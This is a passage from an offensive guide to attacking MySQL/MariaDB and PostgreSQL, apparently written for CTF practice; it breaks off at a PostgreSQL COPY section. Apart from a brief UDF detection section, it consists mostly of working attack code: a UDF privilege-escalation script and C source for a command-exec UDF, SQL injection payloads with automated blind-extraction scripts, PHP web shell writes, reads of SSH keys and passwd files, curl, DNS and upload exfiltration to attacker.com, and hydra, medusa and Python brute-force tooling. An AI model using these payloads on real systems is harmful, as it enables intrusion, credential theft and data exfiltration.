# 3. Library compilation compatible with target OS
# 4. Ability to load shared object files

# Detection indicators:
# Unexpected UDF functions in information_schema
SELECT * FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_SCHEMA='mysql';

# Suspicious files in plugin directory
ls -la /usr/lib/mysql/plugin/

# Monitor for UDF creation
grep "CREATE FUNCTION" /var/log/mysql/mysql.log

# Prevent UDF exploitation:
# 1. Disable UDF loading in my.cnf: skip-user-resources
# 2. Remove plugin directory write permissions
# 3. Apply principle of least privilege for database users
# 4. Regularly audit created functions
# 5. Use AppArmor/SELinux to restrict MySQL process
```

#### UDF Detection and Removal

Identify and remove UDF backdoors:

```sql
-- List all functions in mysql database
SELECT ROUTINE_NAME FROM INFORMATION_SCHEMA.ROUTINES 
WHERE ROUTINE_SCHEMA='mysql' AND ROUTINE_TYPE='FUNCTION';

-- Identify suspicious functions (especially sys_exec, exec, command, etc.)
SELECT ROUTINE_NAME, ROUTINE_DEFINITION FROM INFORMATION_SCHEMA.ROUTINES 
WHERE ROUTINE_NAME LIKE '%exec%' OR ROUTINE_NAME LIKE '%sys%' OR ROUTINE_NAME LIKE '%command%';

-- Remove malicious UDF
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS lib_mysqludf_sys_exec;

-- Check plugin directory for suspicious .so files
-- Linux: ls -la /usr/lib/mysql/plugin/
-- Look for: unexpected .so files, recent modifications

-- Remove suspicious plugins
rm /usr/lib/mysql/plugin/udf_shell.so

-- Restart MySQL to ensure cleanup
# systemctl restart mysql

-- Verify UDF removal
SELECT * FROM INFORMATION_SCHEMA.PLUGINS WHERE PLUGIN_TYPE='FUNCTION';
```

#### MySQL Privilege Escalation via UDF

Escalate from limited user to root-level access:

```python
#!/usr/bin/env python3
import mysql.connector
import subprocess
import sys

class MySQLPrivEsc:
    def __init__(self, host, limited_user, limited_pass):
        self.host = host
        self.limited_user = limited_user
        self.limited_pass = limited_pass
        self.conn = None
    
    def connect(self):
        """Connect as limited user"""
        try:
            self.conn = mysql.connector.connect(
                host=self.host,
                user=self.limited_user,
                password=self.limited_pass
            )
            print(f"[+] Connected as {self.limited_user}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def check_privileges(self):
        """Check available privileges"""
        try:
            cursor = self.conn.cursor()
            cursor.execute("SHOW GRANTS FOR CURRENT_USER()")
            grants = cursor.fetchall()
            cursor.close()
            
            print(f"[*] Current privileges:")
            for grant in grants:
                print(f"    {grant[0]}")
            
            return grants
        except Exception as e:
            print(f"[-] Error: {e}")
            return None
    
    def exploit_udf(self, udf_library_path):
        """Exploit UDF to escalate privileges"""
        try:
            cursor = self.conn.cursor()
            
            # Create UDF function if not exists
            cursor.execute(f"CREATE FUNCTION sys_exec RETURNS STRING SONAME '{udf_library_path}'")
            self.conn.commit()
            
            # Execute privileged command via UDF
            cursor.execute("SELECT sys_exec('whoami')")
            result = cursor.fetchone()
            
            print(f"[+] Command executed with privileges: {result[0]}")
            
            cursor.close()
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def close(self):
        if self.conn:
            self.conn.close()

# Usage
if __name__ == "__main__":
    priv_esc = MySQLPrivEsc("target.com", "limited_user", "password")
    
    if priv_esc.connect():
        priv_esc.check_privileges()
        priv_esc.exploit_udf("udf_shell.so")
        priv_esc.close()
```

---

### SQL Injection in MySQL Context

SQL injection in MySQL contexts allows attackers to manipulate database queries, extracting sensitive data, modifying records, or executing operating system commands.

#### MySQL-Specific SQL Injection Detection

**Identifying MySQL backend:**

```bash
# Error-based detection reveals MySQL version
# Trigger error and analyze response

# Test query
' OR 1=1-- -
' OR '1'='1

# MySQL-specific error messages
# You have an error in your SQL syntax; check the manual...
# Unknown column 'x' in 'on clause'

# Version detection
' UNION SELECT @@version-- -
' UNION SELECT VERSION()-- -

# Response indicates MySQL version
# mysql-5.7.30-0ubuntu0.18.04.1
```

**Detection via timing:**

```bash
# MySQL SLEEP() function for blind SQL injection
' OR SLEEP(5)-- -

# If response delays 5 seconds, MySQL backend confirmed
# SLEEP() only in MySQL, not SQLite or PostgreSQL

# MariaDB uses same SLEEP() function
```

**Information schema enumeration:**

```bash
# MySQL stores metadata in INFORMATION_SCHEMA database
# Query available regardless of application visibility

# List all databases
' UNION SELECT schema_name FROM information_schema.schemata-- -

# List tables in database
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database_name'-- -

# List columns in table
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='table_name'-- -

# Example result:
# INFORMATION_SCHEMA
# mysql
# performance_schema
# sys
# application_db
```

#### Authentication Bypass via SQL Injection

**Login form bypass:**

```sql
-- Original query
SELECT * FROM users WHERE username='admin' AND password='password'

-- Injected query (authentication bypass)
SELECT * FROM users WHERE username='admin'-- -' AND password='anything'

-- Payloads for login forms
Username: admin'-- -
Password: anything

-- Results in query:
-- SELECT * FROM users WHERE username='admin'-- -' AND password='anything'
-- Comments out password check, authentication succeeds

-- Alternative payload
Username: ' OR '1'='1
Password: anything

-- Query becomes:
-- SELECT * FROM users WHERE username='' OR '1'='1' AND password='anything'
-- OR condition always true, bypasses authentication
```

#### UNION-Based SQL Injection

**Column count determination:**

```bash
# Identify number of columns returned by original query
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
# Continue until error occurs

# Error indicates too many columns
# Last successful ORDER BY reveals column count

# Example: ORDER BY 4 produces error, ORDER BY 3 succeeds
# Original query returns 3 columns
```

**UNION SELECT payload construction:**

```bash
# Craft UNION SELECT with same column count
' UNION SELECT 1,2,3-- -

# Results show which columns are displayed
# If columns 1 and 2 appear in output
# Can use for data extraction

# Extract database version
' UNION SELECT 1,@@version,3-- -

# Extract current user
' UNION SELECT 1,CURRENT_USER(),3-- -

# Extract database name
' UNION SELECT 1,DATABASE(),3-- -
```

**Multi-row data extraction:**

```bash
# Extract usernames and passwords
' UNION SELECT username,password,3 FROM users-- -

# Results display in application output:
# admin | $2y$10$hash...
# user1 | $2y$10$hash...
# user2 | $2y$10$hash...

# Extract from multiple tables
' UNION SELECT username,email,password FROM users-- -
' UNION SELECT CONCAT(column1,':',column2),3,4 FROM table_name-- -
```

#### Boolean-Based Blind SQL Injection

**Extracting data character by character:**

```bash
# Payload tests if condition true/false
# Application response differs (True: normal page, False: error/different page)

# Test first character of password
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='b'-- -
# Continue until true response

# Automate with sqlmap or custom script
python3 << 'EOF'
import requests
import string

def blind_sql_injection(target_url, query):
    """Extract data via boolean-based blind SQL injection"""
    
    extracted = ""
    for position in range(1, 50):
        for char in string.ascii_lowercase + string.digits:
            # Test if character at position matches
            payload = f"' AND SUBSTRING(({query}),{position},1)='{char}'-- -"
            
            params = {'user': payload}
            response = requests.get(target_url, params=params)
            
            # If response indicates true condition
            if "welcome" in response.text.lower():
                extracted += char
                print(f"Found: {extracted}")
                break
    
    return extracted

# Extract password
password = blind_sql_injection(
    "http://target.com/login.php",
    "(SELECT password FROM users LIMIT 1)"
)
print(f"Password: {password}")
EOF
```

**[Inference] Time-based blind exploitation:**

```bash
# If boolean extraction fails, use time delays

# Payload: if condition true, sleep 5 seconds
' AND IF(1=1,SLEEP(5),0)-- -

# Application response delayed if condition true
# No delay if condition false

# Extract data timing character
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)-- -

# If response delayed 5 seconds, first character is 'a'
# Continue with remaining characters

# Slower than boolean but works against filtered responses
```

#### Error-Based SQL Injection

**Extracting data via error messages:**

```bash
# MySQL functions that generate errors with data
# EXTRACTVALUE() - XML parsing error
# UPDATEXML() - XML update error

# Basic syntax
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -

# Error message includes database name:
# XPATH syntax error: '~application_db'

# Extract user data
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(username) FROM users)))-- -

# GROUP_CONCAT limits output size but combines multiple rows
# Result in error message

# Extract credentials
' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,':',password) FROM users)),1)-- -
```

**[Unverified] Stack-based error exploitation:**

```bash
# Some MySQL configurations expose error stack traces
# Stack includes data from queries

# Payload generates stack trace with data
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

# Error reveals database name in stack trace
```

#### Stacked Queries and Command Execution

**MySQL limitations on stacked queries:**

```bash
# Most MySQL interfaces don't support multiple statements
# mysqli, PDO by default don't allow stacked queries

# However, some contexts allow:
# - Direct MySQL CLI access
# - Custom applications with inadequate filtering

# Stacked query example (if allowed)
'; DROP TABLE users;-- -
'; UPDATE users SET admin=1;-- -
```

**Out-of-band data exfiltration:**

```bash
# If application doesn't display SQL results
# Use DNS/HTTP to exfiltrate data

# MySQL DNS exfiltration (if DNS resolution possible from DB server)
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',SUBSTRING((SELECT password FROM users LIMIT 1),1,10),'.attacker.com\\file'))-- -

# Database server attempts to load file from network path
# Results in DNS query to attacker.com
# Query contains password data

# Monitor attacker DNS server
tcpdump -i eth0 'udp port 53'

# Incoming DNS query reveals exfiltrated data
```

**INTO OUTFILE exploitation:**

```bash
# Write query results to file on server
' UNION SELECT username,password,3 INTO OUTFILE '/var/www/html/output.txt' FROM users-- -

# If MySQL has FILE privileges and web root writable
# File created with extracted data

# Access via HTTP
curl http://target.com/output.txt

# Output displays usernames and passwords
admin:$2y$10$hash...
user1:$2y$10$hash...
```

#### Automated SQL Injection with SQLmap

```bash
# Identify injection point
sqlmap -u "http://target.com/search.php?q=test" -p q --risk=3 --level=5

# --risk: 3 = high risk payloads
# --level: 5 = maximum detection level

# Enumerate databases
sqlmap -u "http://target.com/search.php?q=test" -p q --dbs

# Dump specific database
sqlmap -u "http://target.com/search.php?q=test" -p q -D application_db --dump

# Dump specific table
sqlmap -u "http://target.com/search.php?q=test" -p q -D application_db -T users --dump

# Dump specific column
sqlmap -u "http://target.com/search.php?q=test" -p q -D application_db -T users -C password --dump

# Interactive shell
sqlmap -u "http://target.com/search.php?q=test" -p q --sql-shell
```

### Privilege Escalation Within MySQL

MySQL privilege escalation allows compromised low-privilege accounts to gain administrative access.

#### MySQL User Privilege Structure

**Understanding MySQL permissions:**

```bash
# Connect as low-privilege user
mysql -u application_user -p -h localhost

# Check current user privileges
SHOW GRANTS FOR CURRENT_USER();

# Output example:
# GRANT SELECT, INSERT, UPDATE ON `application_db`.* TO 'application_user'@'localhost'

# Check all user permissions
SHOW GRANTS FOR 'application_user'@'localhost';

# List all users (requires SELECT on mysql database)
SELECT user, host FROM mysql.user;

# Check specific user permissions
SELECT user, host, Super_priv, Grant_priv FROM mysql.user;
```

**Privilege types in MySQL:**

```
Global privileges (any database):
- SELECT, INSERT, UPDATE, DELETE
- CREATE, ALTER, DROP
- GRANT, REVOKE (grant privilege changes to others)
- SUPER (various administrative functions)

Database-level privileges:
- ALTER, CREATE, DROP (database operations)
- GRANT (grant database privileges)

Table-level privileges:
- SELECT, INSERT, UPDATE, DELETE

Column-level privileges:
- SELECT, INSERT, UPDATE (per column)

Routine privileges:
- EXECUTE, ALTER ROUTINE, CREATE ROUTINE (stored procedures/functions)
```

#### SUPER Privilege Escalation

**Identifying SUPER privilege opportunities:**

```bash
# Check if current user has SUPER
SHOW GRANTS FOR CURRENT_USER();
# If no SUPER listed, not available

# Find users with SUPER
SELECT user, host, Super_priv FROM mysql.user WHERE Super_priv='Y';

# SUPER allows:
# - SET GLOBAL variables
# - KILL connections
# - Purge logs
# - Replication
```

**Escalation via global variable modification:**

```bash
# If user has FILE privilege with SELECT/INSERT
# Modify secure_file_priv to write files

SET GLOBAL secure_file_priv='';

# Now can write to arbitrary locations (with appropriate FILE privilege)
SELECT 'shell_code' INTO OUTFILE '/var/www/html/shell.php';

# Access shell via HTTP
curl http://target.com/shell.php
```

#### FILE Privilege Exploitation

**Prerequisites for FILE privilege use:**

```bash
# FILE privilege alone insufficient
# Requires SELECT, INSERT, or UPDATE

# Check FILE privilege
SHOW GRANTS FOR 'application_user'@'localhost';
# GRANT SELECT, INSERT, FILE ON *.* TO 'application_user'@'localhost'

# Check secure_file_priv setting
SHOW VARIABLES LIKE 'secure_file_priv';
# secure_file_priv: /var/lib/mysql-files/

# If empty string: any location writable
# If NULL: FILE privilege disabled
# If path: only that directory writable
```

**Writing web shells via FILE privilege:**

```bash
# Create shell file content (if FILE allows and path accessible)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# If secure_file_priv=/var/lib/mysql-files/
# Write to that location
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/lib/mysql-files/shell.php';

# Move file (requires shell access)
mv /var/lib/mysql-files/shell.php /var/www/html/shell.php

# Access web shell
curl http://target.com/shell.php?cmd=id
```

**Reading sensitive files:**

```bash
# Read system files (if FILE privilege and files readable by MySQL user)
SELECT LOAD_FILE('/etc/passwd');

# Output displays file contents
# root:x:0:0:root:/root:/bin/bash
# mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false

# Read SSH keys
SELECT LOAD_FILE('/root/.ssh/id_rsa');

# Read application configuration
SELECT LOAD_FILE('/var/www/html/config.php');

# Read database backups
SELECT LOAD_FILE('/var/backups/database.sql');
```

#### GRANT Privilege Escalation

**GRANT privilege allows privilege delegation:**

```bash
# User with GRANT can modify other user privileges
# Check if user has GRANT
SHOW GRANTS FOR CURRENT_USER();
# GRANT ... WITH GRANT OPTION indicates GRANT privilege

# Escalate own privileges if GRANT privilege has scope
GRANT SUPER ON *.* TO 'application_user'@'localhost';

# Grant self all privileges (if appropriate GRANT scope)
GRANT ALL ON *.* TO 'application_user'@'localhost' WITH GRANT OPTION;

# Now application_user has full database access
```

#### Exploiting Weak Password Hashes

**MySQL password storage:**

```bash
# MySQL 5.7.6+ uses SHA2-256 password hashing
# Older versions use MySQL Hash (weaker)

# Check password storage format
SELECT user, authentication_string FROM mysql.user;

# MySQL Hash format: *hash_value
# SHA2 format: $A$005$hash (MySQL 5.7.6+)

# Crack weak hashes offline
hashcat -m 200 mysql_hashes.txt wordlist.txt

# Mode 200: MySQL323 (old weak hash)
# Mode 300: MySQL4.1+ (SHA1-based)
```

**[Inference] Credential reuse:**

```bash
# Extract password hashes
SELECT user, authentication_string FROM mysql.user;

# Crack hashes
john --wordlist=wordlist.txt --format=mysql mysql_hashes.txt

# Test credentials against other services
# Database user password may be reused on:
# - Linux system accounts
# - SSH access
# - Other database instances
# - Application accounts
```

#### UDF (User Defined Function) Exploitation

**Loading malicious UDFs:**

```bash
# UDFs allow executing compiled C/C++ code from MySQL

# Requirements:
# - FILE privilege (load .so/.dll files)
# - sys_exec_dir writable
# - MySQL plugin directory writable

# [Unverified] Metasploit payload for UDF execution
use exploit/linux/mysql/mysql_udf_priv_escalation
set RHOST target.com
set LHOST attacker.com
set PAYLOAD linux/x86/meterpreter/reverse_tcp
run

# If successful:
# - UDF compiled to .so file
# - Loaded into MySQL
# - System command execution achieved
# - Meterpreter shell established
```

**Manual UDF loading:**

```bash
# Create malicious C code (sys_exec.c)
cat > sys_exec.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mysql.h>

char *sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    FILE *pipe;
    static char output[1024];
    
    if (args->arg_count < 1) return NULL;
    
    pipe = popen((char *)args->args[0], "r");
    if (!pipe) return NULL;
    
    fgets(output, sizeof(output), pipe);
    pclose(pipe);
    
    return output;
}
EOF

# Compile
gcc -shared -fPIC -I/usr/include/mysql -o sys_exec.so sys_exec.c

# Copy to MySQL plugin directory
cp sys_exec.so /usr/lib/mysql/plugin/

# Load UDF into MySQL
mysql -u root -p -e "CREATE FUNCTION sys_exec RETURNS STRING SONAME 'sys_exec.so';"

# Execute commands
mysql -u root -p -e "SELECT sys_exec('id');"

# Returns command output
```

#### Privilege Escalation via SQL Injection to User Creation

```bash
# If application vulnerable to SQL injection
# AND has database creation privileges

# Injected query creates new admin user
' ; CREATE USER 'attacker'@'localhost' IDENTIFIED BY 'password' ; GRANT ALL ON *.* TO 'attacker'@'localhost' ; -- -

# Connect as new admin
mysql -u attacker -ppassword

# Full database access achieved
```

### Data Exfiltration Techniques

Extracting sensitive data from MySQL databases after gaining access or through SQL injection.

#### Direct Database Dumping

**Using mysqldump:**

```bash
# Export entire database
mysqldump -u root -p application_db > dump.sql

# Export specific tables
mysqldump -u root -p application_db users transactions > dump.sql

# Export only table structure (no data)
mysqldump -u root -p -d application_db > schema.sql

# Export data only (no structure)
mysqldump -u root -p -t application_db > data.sql

# Compress for faster exfiltration
mysqldump -u root -p application_db | gzip > dump.sql.gz
```

**Selective data extraction:**

```bash
# Export specific records
mysqldump -u root -p application_db users \
  --where="privilege_level > 5" > high_privilege_users.sql

# Export limited number of records
mysqldump -u root -p application_db transactions \
  --where="1 LIMIT 1000" > first_1000_transactions.sql

# Export with no locks (faster, risky for consistency)
mysqldump -u root -p -Q -l -h localhost application_db > dump.sql
```

#### Remote Exfiltration via SQL Queries

**INTO OUTFILE to web-accessible directory:**

```bash
# Write results to file
SELECT username, password, email 
INTO OUTFILE '/var/www/html/users.txt' 
FROM users;

# Access via HTTP
curl http://target.com/users.txt

# File contains:
# admin    $2y$10$hash    admin@target.com
# user1    $2y$10$hash    user1@target.com
```

**INTO OUTFILE with CSV format:**

```bash
# Export as CSV for easier parsing
SELECT username, password, email 
INTO OUTFILE '/var/www/html/users.csv'
FIELDS TERMINATED BY ',' 
ENCLOSED BY '"'
LINES TERMINATED BY '\n'
FROM users;

# Download and process
curl http://target.com/users.csv | head -10
```

**INTO DUMPFILE for binary data:**

```bash
# DUMPFILE writes exact bytes (no line termination conversion)
# Useful for binary data like images

SELECT content 
INTO DUMPFILE '/var/www/html/image.jpg'
FROM images WHERE id=1;

# Access binary file
curl http://target.com/image.jpg -o image.jpg
```

#### DNS Exfiltration

**DNS-based covert channel:**

```bash
# Exfiltrate via DNS queries to attacker server
# Data encoded in subdomain

# Query each character as subdomain
SELECT 
  CONCAT(
    SUBSTRING((SELECT password FROM users LIMIT 1),1,1),
    '.attacker.com'
  ) AS domain;

# Triggers DNS query for subdomain
# First character of password visible in DNS logs

# Attacker monitors DNS:
tcpdump -i eth0 'udp port 53' | grep attacker.com

# Extract all password characters
SELECT CONCAT(
  (SELECT GROUP_CONCAT(
    SUBSTRING(
      (SELECT password FROM users LIMIT 1), 
      1, 20
    )
  )),
  '.attacker.com'
) AS domain;
```

**DNS resolution for data extraction:**

```bash
# Force DNS resolution to encode data
# MySQL resolves hostname, reveals data in request

# Via UDF or system calls (requires appropriate privileges)
SELECT sys_exec(CONCAT('nslookup ', 
  (SELECT password FROM users LIMIT 1), 
  '.attacker.com'
));

# Database server performs DNS lookup
# Query contains password as subdomain
```

#### HTTP/HTTPS Exfiltration

**Outbound HTTP requests from stored procedures:**

```bash
# If MySQL can execute system commands (UDF or SUPER)
# Create HTTP request via curl

# UDF-based exfiltration
SELECT sys_exec(CONCAT('curl http://attacker.com/?data=',
  CONCAT(
    (SELECT GROUP_CONCAT(username,':',password) FROM users),
    '&key=secret'
  )
));

# Database server makes HTTP request
# Data sent to attacker server

# Attacker logs HTTP request
tcpdump -i eth0 'tcp port 80'
# GET /?data=admin:hash,user1:hash&key=secret HTTP/1.1
```

#### Sequential Data Extraction for Size Limits

**Limiting result size for exfiltration:**

```bash
# If exfiltration method limits data size
# Extract in batches

# Using LIMIT and OFFSET
SELECT username, password 
INTO OUTFILE '/var/www/html/users_batch1.txt'
FROM users 
LIMIT 100;

SELECT username, password 
INTO OUTFILE '/var/www/html/users_batch2.txt'
FROM users 
LIMIT 100 OFFSET 100;

# Repeat with different offsets
# Reassemble batches

cat users_batch1.txt users_batch2.txt > all_users.txt
```

**GROUP_CONCAT with length limit:**

```bash
# GROUP_CONCAT limited to 1024 bytes by default
# Adjust group_concat_max_len for larger extracts

SET GROUP_CONCAT_MAX_LEN = 65536;

# Now extract larger result sets
SELECT GROUP_CONCAT(username,':',password) 
INTO OUTFILE '/var/www/html/users.txt'
FROM users;
```

#### Exfiltration via Application Error Messages

**Error-based data leakage:**

```bash
# If application displays SQL errors
# Craft query generating error with data

# Insert large string into integer field (type error)
SELECT * FROM users WHERE id = 
  (SELECT CAST(CONCAT('Error: ', password) AS UNSIGNED) 
   FROM users LIMIT 1);

# Error message contains password:
# Truncated incorrect integer value: 'Error: $2y$10$hash...'

# Application displays error to user
# Attacker extracts data from error
```

#### Time-Based Exfiltration

**[Inference] Extracting data via response timing:**

```bash
# When other methods blocked
# Extract data character-by-character via timing

# Python exfiltration script
python3 << 'EOF'
import requests
import time
import string

def extract_via_timing(database, table, column):
    """Extract data using time-based covert channel"""
    
    extracted = ""
    
    for position in range(1, 100):
        for char in string.ascii_letters + string.digits + ".,!@#$%^&*()_+-=":
            
            # Query sleeps if character matches
            payload = f"' OR IF(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{position},1)='{char}',SLEEP(3),0)-- -"
            
            start = time.time()
            try:
                response = requests.get(
                    f"http://target.com/search.php",
                    params={'q': payload},
                    timeout=10
                )
            except requests.Timeout:
                elapsed = 10
            else:
                elapsed = time.time() - start
            
            # 3+ second delay indicates matching character
            if elapsed >= 3:
                extracted += char
                print(f"Found: {extracted}")
                break
    
    return extracted
EOF
```

#### Compression and Staging

**Compressing data for faster exfiltration:**

```bash
# Create compressed dump
mysqldump -u root -p application_db | gzip > dump.sql.gz

# Compress with bzip2 for better ratio
mysqldump -u root -p application_db | bzip2 > dump.sql.bz2

# Upload compressed file
curl -F "file=@dump.sql.gz" http://attacker.com/upload.php

# Decompress on attacker system
gunzip dump.sql.gz
bzip2 -d dump.sql.bz2
```

**Staging data in temporary locations:**

```bash
# Write to temp directory first
SELECT * INTO OUTFILE '/tmp/staging.txt' FROM users;

# Compress in temp
SELECT sys_exec('gzip /tmp/staging.txt');

# Move to web-accessible location
SELECT sys_exec('mv /tmp/staging.txt.gz /var/www/html/');

# Download
curl http://target.com/staging.txt.gz -o staging.txt.gz
```

#### Cryptographic Exfiltration

**Encrypting sensitive data during exfiltration:**

```bash
# Encrypt extracted data before writing
SELECT AES_ENCRYPT(
  GROUP_CONCAT(username, ':', password),
  'encryption_key'
) INTO OUTFILE '/var/www/html/users_enc.txt'
FROM users;

# Download encrypted file
curl http://target.com/users_enc.txt -o users_enc.txt

# Decrypt on attacker system
openssl enc -aes-256-cbc -d -in users_enc.txt -K key -iv iv
```

#### Exfiltration via Database Replication

**Replication-based data copying:**

```bash
# Configure compromised MySQL as replication master
# Set up second MySQL instance as slave

# On compromised MySQL:
SHOW MASTER STATUS;

# On attacker system:
CHANGE MASTER TO
  MASTER_HOST='target.com',
  MASTER_USER='replication_user',
  MASTER_PASSWORD='password',
  MASTER_LOG_FILE='mysql-bin.000001',
  MASTER_LOG_POS=154;

START SLAVE;

# Attacker's MySQL receives all database changes
# Full data replication to attacker system
```

---

**MySQL/MariaDB exploitation workflow summary:**

1. **Identify injection point** - Detect SQL injection via errors, timing, or blind techniques
2. **Enumerate database structure** - Query information_schema for schema details
3. **Extract credentials** - Use UNION or error-based injection to retrieve password hashes
4. **Escalate privileges** - Exploit GRANT, FILE, or SUPER privileges for administrative access
5. **Exfiltrate data** - Use INTO OUTFILE, DNS, HTTP, or compression for data extraction
6. **Establish persistence** - Create administrative accounts or UDFs for future access

MySQL exploitation in CTF contexts typically combines SQL injection discovery with privilege escalation and large-scale data extraction under time constraints.

---

## PostgreSQL Exploitation

### Brute Force PostgreSQL

PostgreSQL uses username/password authentication on port 5432 (default). Brute forcing can reveal weak credentials for database access.

**Basic PostgreSQL Enumeration**

```bash
# Check if PostgreSQL is running
nmap -p 5432 target_ip
nmap -p 5432 -sV target_ip

# PostgreSQL version detection
nmap -p 5432 --script pgsql-brute target_ip
nmap -p 5432 --script postgresql-info target_ip

# Test anonymous/guest access
psql -h target_ip -U postgres -d postgres
psql -h target_ip -U postgres -d template1

# Check for common databases
for db in postgres template0 template1 testdb production; do
  echo "[*] Testing database: $db"
  psql -h target_ip -U postgres -d $db -c "SELECT version();" 2>&1 | grep -v "authentication failed"
done
```

**PostgreSQL Brute Force with Hydra**

```bash
# Basic brute force attack
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://target_ip

# Multiple usernames
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt postgres://target_ip

# Specific database
hydra -l postgres -P passwords.txt postgres://target_ip/postgres

# With custom port
hydra -l postgres -P passwords.txt postgres://target_ip:5432

# Optimized for speed
hydra -l postgres -P passwords.txt postgres://target_ip -t 4 -V

# Common PostgreSQL passwords
cat > pg_passwords.txt << EOF
postgres
password
admin
root
123456
12345
pass
secret
database
EOF

hydra -l postgres -P pg_passwords.txt postgres://target_ip
```

**PostgreSQL Brute Force with Medusa**

```bash
# Basic medusa attack
medusa -h target_ip -u postgres -P passwords.txt -M postgres

# Multiple users
medusa -h target_ip -U users.txt -P passwords.txt -M postgres

# With specific database
medusa -h target_ip -u postgres -P passwords.txt -M postgres -m DATABASE:postgres

# With threading
medusa -h target_ip -u postgres -P passwords.txt -M postgres -t 10

# Continue on success
medusa -h target_ip -U users.txt -P passwords.txt -M postgres -F
```

**PostgreSQL Brute Force with Metasploit**

```bash
# Using metasploit scanner
msfconsole -q << EOF
use auxiliary/scanner/postgres/postgres_login
set RHOSTS target_ip
set USERNAME postgres
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt
set STOP_ON_SUCCESS true
set THREADS 5
run
exit
EOF

# With user enumeration
msfconsole -q << EOF
use auxiliary/scanner/postgres/postgres_login
set RHOSTS target_ip
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE passwords.txt
run
exit
EOF
```

**Nmap PostgreSQL Brute Force**

```bash
# Basic nmap brute force
nmap -p 5432 --script pgsql-brute target_ip

# With custom wordlists
nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt target_ip

# With timing control
nmap -p 5432 --script pgsql-brute --script-args brute.threads=5 target_ip

# Multiple targets
nmap -p 5432 --script pgsql-brute -iL targets.txt
```

**Custom PostgreSQL Brute Force Script**

```python
#!/usr/bin/env python3
# pg_bruteforce.py

import psycopg2
import sys
from concurrent.futures import ThreadPoolExecutor

def test_login(host, user, password, database='postgres'):
    """Test PostgreSQL login credentials"""
    try:
        conn = psycopg2.connect(
            host=host,
            port=5432,
            user=user,
            password=password,
            database=database,
            connect_timeout=5
        )
        conn.close()
        return True
    except psycopg2.OperationalError:
        return False
    except Exception as e:
        return False

def brute_force(host, user, password_file, database='postgres'):
    """Brute force PostgreSQL credentials"""
    print(f"[*] Starting brute force against {host}")
    print(f"[*] Username: {user}")
    print(f"[*] Database: {database}")
    
    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f]
    
    for password in passwords:
        print(f"[-] Trying: {password}", end='\r')
        if test_login(host, user, password, database):
            print(f"\n[+] SUCCESS! Username: {user}, Password: {password}")
            return (user, password)
    
    print(f"\n[-] Brute force completed. No valid credentials found.")
    return None

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <host> <username> <password_file> [database]")
        sys.exit(1)
    
    host = sys.argv[1]
    user = sys.argv[2]
    password_file = sys.argv[3]
    database = sys.argv[4] if len(sys.argv) > 4 else 'postgres'
    
    brute_force(host, user, password_file, database)
```

### Default Credentials

**Common Default PostgreSQL Credentials**

```bash
# Most common defaults
cat > pg_defaults.txt << EOF
postgres:postgres
postgres:password
postgres:admin
postgres:root
postgres:
admin:admin
admin:password
root:root
user:user
EOF

# Test with hydra
hydra -C pg_defaults.txt postgres://target_ip

# Manual testing
psql -h target_ip -U postgres -d postgres  # Empty password
psql -h target_ip -U postgres -d postgres -W  # Prompt for password: try 'postgres'
```

**Vendor-Specific Defaults**

```bash
# PostgreSQL common defaults
psql -h target_ip -U postgres -d postgres  # postgres:postgres
psql -h target_ip -U admin -d postgres     # admin:admin
psql -h target_ip -U root -d postgres      # root:root

# Application-specific defaults
# Redmine
psql -h target_ip -U redmine -d redmine  # redmine:redmine

# GitLab
psql -h target_ip -U gitlab -d gitlabhq_production

# Zabbix
psql -h target_ip -U zabbix -d zabbix  # zabbix:zabbix

# Metasploit
psql -h target_ip -U msf -d msf  # msf:msf
```

**Testing Default Credentials Script**

```bash
# Automated default credential tester
cat > test_pg_defaults.sh << 'SCRIPT'
#!/bin/bash

TARGET=$1

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

# Common username:password combinations
declare -A DEFAULTS=(
    ["postgres"]="postgres password admin 123456 root"
    ["admin"]="admin password postgres"
    ["root"]="root password postgres"
    ["user"]="user password"
)

echo "[*] Testing default PostgreSQL credentials on $TARGET"

for user in "${!DEFAULTS[@]}"; do
    for pass in ${DEFAULTS[$user]}; do
        echo -n "[*] Testing $user:$pass ... "
        PGPASSWORD=$pass psql -h $TARGET -U $user -d postgres -c "SELECT version();" &>/dev/null
        if [ $? -eq 0 ]; then
            echo "SUCCESS!"
            echo "[+] Valid credentials found: $user:$pass"
            exit 0
        else
            echo "Failed"
        fi
    done
done

echo "[-] No default credentials found"
SCRIPT

chmod +x test_pg_defaults.sh
./test_pg_defaults.sh target_ip
```

### Copy To/From File Exploitation

PostgreSQL's COPY command can read/write files on the server filesystem if the user has appropriate permissions (typically requires superuser role).

**File Read Exploitation**

```bash
# Connect to PostgreSQL
